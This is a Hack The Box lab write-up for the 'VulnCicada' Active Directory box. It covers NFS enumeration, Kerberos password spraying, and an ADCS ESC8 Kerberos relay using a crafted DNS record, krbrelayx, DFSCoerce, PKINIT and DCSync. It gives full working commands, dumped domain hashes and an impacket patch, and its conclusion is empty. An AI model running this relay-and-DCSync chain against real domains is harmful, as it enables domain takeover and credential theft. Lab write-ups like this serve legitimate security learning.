---
layout: post
title: "Hack The Box: VulnCicada Writeup"
date: 2026-02-10
categories: [HTB, Windows, Medium]
tags: [AD, Kerberos, ADCS, ESC8, NFS, Kerberos Relay, CredMarshal, DFSCoerce, PKINIT, DCSync]
author: varadkj
image: /assets/img/vulncicada_thumb.jpg
---

VulnCicada is a Medium-rated Windows Active Directory box from Hack The Box that is fundamentally about proper, thorough manual enumeration across multiple services. The twist? Nearly every traditional avenue is a dead end at first — NULL and guest logins are disabled on SMB and RPC, LDAP requires bind authentication, and the web server yields nothing useful. The box highlights how a UDP scan, something most people tend to overlook, can be the key that unlocks everything. In this case, it revealed an NFS share containing usernames, which led to a bit of a troll involving a password hidden in plain sight inside an image. From there, the privilege escalation path is an ADCS ESC8 attack, but with a critical complication: NTLM authentication is completely disabled on the domain, meaning we have to relay Kerberos instead — a technique rooted in cutting-edge research from Synacktiv, Cymulate, and decoder.cloud.

---

## Reconnaissance

I started with a basic nmap scan to identify open ports.

```bash
└─$ nmap -p- --min-rate 10000 -oN nmap/vulncicada-open-ports 10.129.20.23 -vv
```

```text
Nmap scan report for 10.129.20.23
Host is up, received echo-reply ttl 127 (0.023s latency).
Scanned at 2026-02-10 18:27:47 EST for 13s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
111/tcp   open  rpcbind          syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
52258/tcp open  unknown          syn-ack ttl 127
52343/tcp open  unknown          syn-ack ttl 127
52791/tcp open  unknown          syn-ack ttl 127
58212/tcp open  unknown          syn-ack ttl 127
58213/tcp open  unknown          syn-ack ttl 127
```

Then I ran a detailed script and service scan on the open ports:

```bash
└─$ nmap -p53,80,88,111,135,139,389,445,636,3268,3269,3389,49664,49667,52258,52343,52791,58212,58213 -sC -sV -A -oN nmap/vulncicada-detailed-scan 10.129.20.23 -vv
```

```text
Nmap scan report for 10.129.20.23
Host is up, received echo-reply ttl 127 (0.020s latency).
Scanned at 2026-02-10 18:33:38 EST for 129s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-10 23:33:29Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Issuer: commonName=DC-JPQ225.cicada.vl
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52258/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52343/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52791/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58212/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
58213/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-10T23:34:37
|_  start_date: N/A
```

Key findings from the detailed scan:

- **DNS (53)**: Simple DNS Plus
- **HTTP (80)**: Microsoft IIS httpd 10.0
- **Kerberos (88)**: Microsoft Windows Kerberos
- **RPC (111)**: rpcbind 2-4 — also reveals NFS (2049) and mountd services
- **LDAP (389)**: Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
- **SSL Cert CN**: DC-JPQ225.cicada.vl
- **Issuer**: cicada-DC-JPQ225-CA (indicating ADCS is present)
- **SMB Signing**: Enabled and required
- **OS Guess**: Microsoft Windows Server 2022

**NOTE**: In the LDAP output, the domain shows as `cicada.vl0` — the trailing `0` is just an LDAP formatting artifact. The actual domain is `cicada.vl`.

I added `DC-JPQ225.cicada.vl` and `cicada.vl` to `/etc/hosts`.

---

## DNS Enumeration

```bash
└─$ dig ANY cicada.vl @10.129.20.23
```

```text
;; ANSWER SECTION:
cicada.vl.              600     IN      A       10.129.20.23
cicada.vl.              3600    IN      NS      dc-jpq225.cicada.vl.
cicada.vl.              3600    IN      SOA     dc-jpq225.cicada.vl. hostmaster.cicada.vl. 234 900 600 86400 3600
cicada.vl.              600     IN      AAAA    dead:beef::4b70:b821:8327:1a31

;; ADDITIONAL SECTION:
dc-jpq225.cicada.vl.    1200    IN      A       10.129.20.23
dc-jpq225.cicada.vl.    1200    IN      AAAA    dead:beef::4b70:b821:8327:1a31
```

Confirmed the trailing `0` issue by trying `cicada.vl0`, which returned `SERVFAIL` — proving it's not a real domain.

I then ran gobuster in DNS enumeration mode:

```bash
└─$ gobuster dns --domain 'cicada.vl' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --resolver 10.129.20.23 --timeout 5s
```

Discovered subdomains:

- `hostmaster.cicada.vl`
- `gc.msdcs.cicada.vl` — Global Catalog
- `domaindnszones.cicada.vl`
- `forestdnszones.cicada.vl`

---

## Web Server Enumeration

```text
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
```

Visiting `http://cicada.vl` showed the default IIS Windows Server page. Same thing on the VHOST `hostmaster.cicada.vl`. No `robots.txt` found.

I ran gobuster in directory mode:

```bash
└─$ gobuster dir -u http://cicada.vl -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,asp,aspx,html,bak
```

Gobuster did not find anything useful.

---

## SMB, RPC, and LDAP Enumeration

### SMB

Running enum4linux and netexec:

```bash
└─$ enum4linux -a 10.129.20.23
└─$ netexec smb 10.129.20.23 -u 'guest' -p '' --shares
```

No NULL or guest logins allowed.

### RPC

```bash
└─$ rpcclient -U 'guest' 10.129.20.23
└─$ rpcclient -U '' 10.129.20.23
```

Same result — no NULL or guest logins.

### LDAP

```bash
└─$ ldapsearch -x -H ldap://10.129.20.23 -b "DC=cicada,DC=vl"
```

Returned an error asking for LDAP bind authentication. Tried null bind and guest bind:

```bash
└─$ ldapsearch -x -H ldap://10.129.20.23 -b "DC=cicada,DC=vl" -D 'guest' -w ''
```

Same error. NULL bind also failed.

**At this point, every traditional enumeration avenue was a dead end.** SMB, RPC, LDAP, and the web server all yielded nothing useful.

---

## Kerberos Enumeration & NFS Discovery

I attempted Kerbrute for username enumeration:

```bash
└─$ ~/tools/kerbrute_linux_amd64 userenum --dc DC-JPQ225.cicada.vl -d cicada.vl /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt
```

This found the UPN `administrator@cicada.vl`, but brute-forcing usernames from wordlists wasn't going to lead anywhere productive. So I went back to my nmap output — it's always crucial to retrace your steps and ensure you've enumerated everything.

I ran a **UDP scan**, which revealed something important:

```bash
└─$ nmap -sU -vv cicada.vl
```

```text
PORT     STATE SERVICE      REASON
53/udp   open  domain       udp-response ttl 127
88/udp   open  kerberos-sec udp-response ttl 127
111/udp  open  rpcbind      udp-response ttl 127
123/udp  open  ntp          udp-response ttl 127
389/udp  open  ldap         udp-response ttl 127
2049/udp open  nfs          udp-response ttl 127
```

**NFS on port 2049!** Let's check the exports:

```bash
└─$ showmount -e 10.129.20.23
```

```text
Export list for 10.129.20.23:
/profiles (everyone)
```

I mounted it:

```bash
└─$ sudo mount -t nfs 10.129.20.23:/profiles /tmp/nsf_share
```

And found usernames! With write permissions too:

```bash
└─$ ls /tmp/nsf_share | tee > found_usernames
└─$ cat found_usernames
```

```text
Administrator
Daniel.Marshall
Debra.Wright
Jane.Carter
Jordan.Francis
Joyce.Andrews
Katie.Ward
Megan.Simpson
Richard.Gibbons
Rosie.Powell
Shirley.West
```

I confirmed these are valid domain usernames using Kerbrute:

```bash
└─$ ~/tools/kerbrute_linux_amd64 userenum --dc DC-JPQ225.cicada.vl -d cicada.vl usernames_lower.txt
```

All valid!

### Inspecting the NFS Share Contents

Running `ls -laRh` on the mounted share showed mostly empty directories except for 2 PNG files. I ran exiftool and strings on them.

The `marketing.png` in Rosie's folder wasn't accessible, so I changed permissions:

```bash
└─$ sudo chown varadkj:varadkj Rosie.Powell/marketing.png
```

Running `strings` on it revealed some XML metadata with an `id` field (`W5M0MpCehiHzreSzNTczkc9d`), which I tested as a password — no success:

```bash
└─$ netexec smb 10.129.20.23 -u usernames_lower.txt -p 'W5M0MpCehiHzreSzNTczkc9d' --shares
```

I ran steghide, stegseek, exiftool, and strings on both images and found nothing. I thought I hit a dead end until I got the bright idea of just **looking at the PNGs**.

`vacation.png` — just a dude in a parachute, nothing notable.

`marketing.png` — **The password is just posted on a sticky note in the image: `Cicada123`**

While this felt like an absolute troll, let's test the password against every user since we don't know if it was reused. I also wasn't sure from the image if the `C` was capital or not, so I tried both variants:

```bash
└─$ cat found_password
```

```text
Cicada123
cicada123
```

### Password Spraying

First I converted the usernames to UPN format:

```bash
└─$ cat usernames_lower.txt | awk '{print $0"@cicada.vl"}' | tee upn_unames
```

```text
administrator@cicada.vl
daniel.marshall@cicada.vl
debra.wright@cicada.vl
jane.carter@cicada.vl
jordan.francis@cicada.vl
joyce.andrews@cicada.vl
katie.ward@cicada.vl
megan.simpson@cicada.vl
richard.gibbons@cicada.vl
rosie.powell@cicada.vl
shirley.west@cicada.vl
```

First attempt with NTLM authentication:

```bash
└─$ netexec smb 10.129.20.23 -u upn_unames -p found_password -d cicada.vl --continue-on-success
```

Every attempt returned `STATUS_NOT_SUPPORTED` — NTLM authentication is disabled!

Switching to Kerberos authentication (`-k`):

```bash
└─$ netexec smb 10.129.20.23 -u found_usernames -p found_password -d cicada.vl -k --shares
```

```text
SMB  10.129.20.23  445  10.129.20.23  [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  10.129.20.23  445  10.129.20.23  [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED
...
SMB  10.129.20.23  445  10.129.20.23  [-] cicada.vl\Rosie.Powell:Cicada123 KDC_ERR_S_PRINCIPAL_UNKNOWN
SMB  10.129.20.23  445  10.129.20.23  [-] cicada.vl\Shirley.West:Cicada123 KDC_ERR_CLIENT_REVOKED
...
SMB  10.129.20.23  445  10.129.20.23  [-] cicada.vl\Rosie.Powell:cicada123 KDC_ERR_PREAUTH_FAILED
SMB  10.129.20.23  445  10.129.20.23  [-] cicada.vl\Shirley.West:cicada123 KDC_ERR_CLIENT_REVOKED
```

Notice that `Rosie.Powell:Cicada123` returned `KDC_ERR_S_PRINCIPAL_UNKNOWN` instead of `KDC_ERR_PREAUTH_FAILED`. Googling this error reveals the KDC cannot associate with a Service Principal Name when using an IP address. So instead of the IP, I tried with the DC's FQDN:

```bash
└─$ netexec smb DC-JPQ225.cicada.vl -u found_usernames -p found_password -d cicada.vl -k --shares
```

```text
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [+] cicada.vl\Rosie.Powell:Cicada123
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  [*] Enumerated shares
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  Share           Permissions     Remark
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  -----           -----------     ------
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  ADMIN$                          Remote Admin
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  C$                              Default share
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  CertEnroll      READ            Active Directory Certificate Services share
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  IPC$            READ            Remote IPC
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  NETLOGON        READ            Logon server share
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  profiles$       READ,WRITE
SMB  DC-JPQ225.cicada.vl 445  DC-JPQ225  SYSVOL          READ            Logon server share
```

**We have valid credentials: `cicada.vl\Rosie.Powell:Cicada123`**

Also notable: the `CertEnroll` share confirms ADCS is present.

---

## SMB Enumeration with Credentials

Using netexec's `spider_plus` module to enumerate share contents:

```bash
└─$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -d cicada.vl -k -M spider_plus
```

Since ADCS is present and CertEnroll is visible, this suggests a potential ESC vulnerability.

---

## ADCS Enumeration — ESC8

Using certipy to enumerate ADCS:

```bash
└─$ certipy find -u Rosie.Powell@cicada.vl -p 'Cicada123' -dc-ip 10.129.20.23 -target DC-JPQ225.cicada.vl -vulnerable -k
```

The output confirmed the environment is **vulnerable to ESC8** — ADCS Web Enrollment is enabled over HTTP without relay protections (no EPA/Channel Binding Tokens).

However, based on our previous enumeration, we know **NTLM authentication is disabled** and only Kerberos is enabled. So the standard ntlmrelayx approach won't work — we need to relay Kerberos instead.

**Disclaimer**: Since ADCS is not my strongest skill and nor is it that important for CPTS, I had to rely on Claude AI for this part as this proved difficult on my own. In the real world (February 2026), we must learn to use AI to get our job done efficiently, and this applies to pentesters as well. AI, like anything, is also a tool — we must use it as needed and not become a tool ourselves. Hence it's important to know what you're doing without just blindly copy-pasting commands.

---

## Privilege Escalation — Kerberos Relay ESC8

### Environment

- **DC**: DC-JPQ225.cicada.vl (10.129.1.114)
- **Attacker**: 10.10.14.176 (tun0)
- **Creds**: Rosie.Powell:Cicada123
- **Target**: http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp
- **NTLM**: Disabled — Kerberos only

**Note**: The DC IP changed from `10.129.20.23` to `10.129.1.114` because I resumed pentesting this box the next day and the instance was assigned a new address.

---

### Understanding the Theory — Why This Works

#### What is ESC8?

ESC8 is an ADCS misconfiguration where the **Web Enrollment endpoint** (`/certsrv/`) is enabled over HTTP without relay protections. Normally, an attacker relays NTLM authentication to this endpoint and requests a certificate on behalf of the victim. But here, **NTLM is completely disabled**, so we need to relay **Kerberos** instead.

#### The Core Problem: Kerberos Wasn't Supposed to Be Relayable

The common misconception is that disabling NTLM and moving to Kerberos makes relay attacks impossible. This is **wrong**. As both the Cymulate and decoder.cloud research demonstrate, Kerberos does NOT inherently prevent relay attacks — protection is enforced at the service level (signing, CBT), not at the protocol level.

When a client authenticates to a service via Kerberos, the final step is sending an **AP-REQ** message containing a **Service Ticket (ST)** encrypted with the target service's machine account key. If an attacker can intercept this AP-REQ and forward it to the real service, the service will accept it — the attacker just impersonated the victim.

The challenge is: how do you make the client request a Service Ticket for a target you choose, while connecting to your machine?

#### The CredMarshalTargetInfo SPN Trick (Synacktiv / James Forshaw)

This is the technique we use:

1. When an SMB client connects to a hostname, it calls `CredMarshalTargetInfo` to build the SPN for the Kerberos ticket request.
2. This function takes the target hostname and **marshals** (encodes) target information into a Base64 blob that gets appended to the hostname.
3. The critical insight: if you register a DNS A record with a specially crafted name like `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` and point it to your attacker IP, then when a client connects to this hostname:
   - The **A record resolves to your IP** → traffic comes to you
   - The **Kerberos stack strips the marshaled suffix** and requests a TGS for `CIFS/DC-JPQ225` → the ticket is valid for the real DC
4. This **decouples** two things that are normally the same:
   - **Where the network traffic goes** → your machine
   - **What SPN the Kerberos ticket is for** → the DC's real SPN

#### The Cymulate CNAME Approach (Alternative — Not Used Here)

The Cymulate research from January 2026 discovered a different primitive: **DNS CNAME abuse**. Instead of the CredMarshal trick, an attacker with a man-in-the-middle DNS position responds to a victim's DNS query with a CNAME record aliasing the requested name to an attacker-chosen hostname, plus an A record pointing to the attacker's IP.

We didn't use it here because the CNAME approach requires being on the **same LAN segment** as the victim for DNS MITM (ARP poisoning, DHCPv6). In this HTB scenario, we're remote over VPN, so the CredMarshal DNS record approach is the correct method.

#### Cross-Protocol Relay

As documented by decoder.cloud, a ticket issued for `CIFS/DC-JPQ225` (SMB class) can be relayed to an `HTTP/DC-JPQ225` service (ADCS). Services rarely validate the SPN service class prefix — they just check the hostname portion and the encryption key.

### Attack Flow

```text
                    ┌──────────────────────────────────────────────┐
                    │  1. Add DNS record:                          │
                    │  DC-JPQ225[marshaled] → 10.10.14.176         │
                    └──────────────┬───────────────────────────────┘
                                   │
                    ┌──────────────▼───────────────────────────────┐
                    │  2. DFSCoerce tells DC:                      │
                    │  "Connect to DC-JPQ225[marshaled]"           │
                    └──────────────┬───────────────────────────────┘
                                   │
                    ┌──────────────▼───────────────────────────────┐
                    │  3. DC resolves DNS → gets our IP            │
                    │     DC requests TGS for CIFS/DC-JPQ225       │
                    │     (its OWN machine account SPN!)           │
                    └──────────────┬───────────────────────────────┘
                                   │
                    ┌──────────────▼───────────────────────────────┐
                    │  4. DC connects to us with AP-REQ            │
                    │     containing a valid service ticket        │
                    │     for DC-JPQ225$ encrypted with its key    │
                    └──────────────┬───────────────────────────────┘
                                   │
                    ┌──────────────▼───────────────────────────────┐
                    │  5. krbrelayx extracts AP-REQ, relays it     │
                    │     to ADCS: /certsrv/certfnsh.asp           │
                    │     Requests DomainController certificate    │
                    └──────────────┬───────────────────────────────┘
                                   │
                    ┌──────────────▼───────────────────────────────┐
                    │  6. ADCS issues certificate for DC-JPQ225$   │
                    │     → PKINIT → TGT → DCSync → Domain Admin  │
                    └──────────────────────────────────────────────┘
```

### Thought Process & Methodology

1. **Enumeration revealed ESC8** — ADCS web enrollment over HTTP, no CBT/EPA. Classic relay target.
2. **NTLM is disabled** — Rules out ntlmrelayx, Responder, all NTLM-based relay. Must use Kerberos relay.
3. **We have domain creds** (Rosie.Powell) — Enough to add DNS records (authenticated users can do this by default in AD), coerce authentication using DFSCoerce, and get a Kerberos TGT.
4. **CredMarshal trick is the right primitive** — We're remote (no LAN MITM), so CNAME abuse won't work.
5. **Target the DC machine account** — If we get a certificate for DC-JPQ225$, we can PKINIT → TGT → DCSync for full domain compromise.

---

### Exploitation — Step by Step

#### Step 1 — Set DNS to DC

```bash
sudo resolvectl dns tun0 10.129.1.114
sudo resolvectl domain tun0 cicada.vl
```

Without this, tools can't resolve `cicada.vl` — the system's default resolver doesn't know about this domain.

#### Step 2 — Get TGT for Rosie.Powell

```bash
impacket-getTGT cicada.vl/Rosie.Powell:'Cicada123' -dc-ip 10.129.1.114
export KRB5CCNAME=Rosie.Powell.ccache
```

#### Step 3 — Add Crafted DNS Record (CredMarshal SPN Trick)

```bash
python3 dnstool.py \
  -u 'cicada.vl\Rosie.Powell' -p 'Cicada123' \
  -r 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' \
  -d 10.10.14.176 \
  --action add \
  DC-JPQ225.cicada.vl --tcp -k
```

We use `-k` for Kerberos auth to the DC (NTLM is disabled). The target must be the DC FQDN, not the IP, for Kerberos to work. The marshaled hostname string points the A record to our tun0 IP.

#### Step 4 — Start krbrelayx (Terminal 1)

```bash
sudo python3 krbrelayx.py \
  -t 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' \
  --adcs \
  --template DomainController \
  -v 'DC-JPQ225$'
```

krbrelayx sets up fake SMB + HTTP servers, waits for incoming Kerberos auth, and relays it to the ADCS endpoint to request a certificate.

#### Step 5 — Coerce DC Authentication with DFSCoerce (Terminal 2)

```bash
export KRB5CCNAME=Rosie.Powell.ccache
python3 dfscoerce.py \
  -k -no-pass \
  'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' \
  DC-JPQ225.cicada.vl
```

This forces the DC to initiate an SMB connection to our crafted hostname. The DC resolves it → gets our IP → requests a TGS for `CIFS/DC-JPQ225` → connects to us → krbrelayx relays the AP-REQ to ADCS.

`ERROR_BAD_NETPATH` (0x35) is expected — the DFS call fails, but the authentication (coercion) already happened.

**Result**: krbrelayx outputs:

```text
[*] GOT CERTIFICATE! ID 94
[*] Writing PKCS#12 certificate to ./DC-JPQ225$.pfx
[*] Certificate successfully written to file
```

#### Step 6 — PKINIT: Certificate → TGT

```bash
python3 gettgtpkinit.py \
  -cert-pfx DC-JPQ225\$.pfx \
  -pfx-pass password \
  cicada.vl/DC-JPQ225\$ \
  dc-jpq225.ccache \
  -dc-ip 10.129.1.114
```

The PFX password is `password` (set in the adcsattack.py patch — see Troubleshooting section below). PKINIT uses the DC machine certificate to request a TGT as DC-JPQ225$.

**Output**:

```text
AS-REP encryption key: 3298818bcb5e90ffb649552d5cd2fc8d3bb86093125f8d5b604d9832dc9459d8
Saved TGT to file
```

#### Step 7 — DCSync: Dump All Domain Hashes

```bash
export KRB5CCNAME=dc-jpq225.ccache
impacket-secretsdump -k -no-pass DC-JPQ225.cicada.vl -just-dc
```

**Key hashes**:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
```

#### Step 8 — Get Administrator TGT & Read Flags

Since NTLM is disabled everywhere, use the AES key for pure Kerberos auth:

```bash
impacket-getTGT cicada.vl/Administrator \
  -aesKey f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a \
  -dc-ip 10.129.1.114
export KRB5CCNAME=Administrator.ccache
```

**Read flags via SMB (Kerberos auth)**:

```bash
impacket-smbclient -k -no-pass DC-JPQ225.cicada.vl
# shares
# use C$
# cd Users\Administrator\Desktop
# ls
# get root.txt
# get user.txt
```

---

## Troubleshooting: pyOpenSSL PKCS12 Patch

krbrelayx uses impacket's `adcsattack.py` to generate the PFX file after obtaining the certificate. On modern Kali, this crashes with:

```text
AttributeError: module 'OpenSSL.crypto' has no attribute 'PKCS12'
```

This happens because `pyOpenSSL >= 24.0.0` removed the deprecated `crypto.PKCS12()` class. The fix is to use the `cryptography` library's `pkcs12` serialization instead.

### The Patch

**File**: `/usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py`

Find the `generate_pfx` method (around line ~108) and replace the entire function with:

```python
    def generate_pfx(self, key, certificate):
        from OpenSSL.crypto import dump_privatekey, FILETYPE_PEM
        from cryptography.hazmat.primitives.serialization import (
            pkcs12,
            BestAvailableEncryption,
            load_pem_private_key,
        )
        from cryptography import x509

        # key is a pyOpenSSL PKey object — dump to PEM bytes
        key_pem = dump_privatekey(FILETYPE_PEM, key)
        key_obj = load_pem_private_key(key_pem, password=None)

        # certificate is a PEM string from the ADCS response — encode to bytes
        if isinstance(certificate, str):
            cert_pem = certificate.encode()
        else:
            cert_pem = certificate

        cert_obj = x509.load_pem_x509_certificate(cert_pem)

        # Serialize as PKCS#12 with password "password"
        pfx_data = pkcs12.serialize_key_and_certificates(
            b"", key_obj, cert_obj, None, BestAvailableEncryption(b"password")
        )
        return pfx_data
```

**Why each step matters**:

- `key` comes from krbrelayx as a pyOpenSSL PKey object → dump to PEM, then load as a `cryptography` private key
- `certificate` comes from ADCS as a PEM string → encode to bytes and load as a `cryptography` x509 certificate
- `pkcs12.serialize_key_and_certificates()` is the modern replacement for the removed `crypto.PKCS12()`
- PFX password is set to `password` — remember this for `gettgtpkinit.py -pfx-pass password`

Apply and optionally downgrade pyopenssl:

```bash
sudo nano /usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py
pip install pyopenssl==23.2.0 --break-system-packages
```

---

## Attack Chain Summary

```text
Rosie.Powell creds (domain user)
  → Add crafted DNS record (CredMarshal SPN trick)
    → DFSCoerce triggers DC to auth to our IP
      → DC requests TGS for CIFS/DC-JPQ225 (its own SPN)
        → krbrelayx relays AP-REQ to ADCS web enrollment (ESC8)
          → Certificate for DC-JPQ225$ machine account
            → PKINIT → TGT as DC-JPQ225$
              → DCSync → All domain hashes
                → Administrator TGT → root.txt + user.txt
```

## Tools Used

- [krbrelayx](https://github.com/dirkjanm/krbrelayx) — dnstool.py, krbrelayx.py
- [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) — coercion trigger
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) — gettgtpkinit.py
- [Impacket](https://github.com/fortra/impacket) — getTGT, secretsdump, smbclient

## References

- [Cymulate — Kerberos Authentication Relay via CNAME Abuse (Jan 2026)](https://cymulate.com/blog/kerberos-authentication-relay-via-cname-abuse/)
- [decoder.cloud — From NTLM Relay to Kerberos Relay (Apr 2025)](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)
- [Synacktiv — Relaying Kerberos over SMB using krbrelayx](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx)
- [James Forshaw — Using Kerberos for Authentication Relay Attacks](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [The Hacker Recipes — Kerberos Relay](https://www.thehacker.recipes/ad/movement/kerberos/relay)

---

## Conclusion

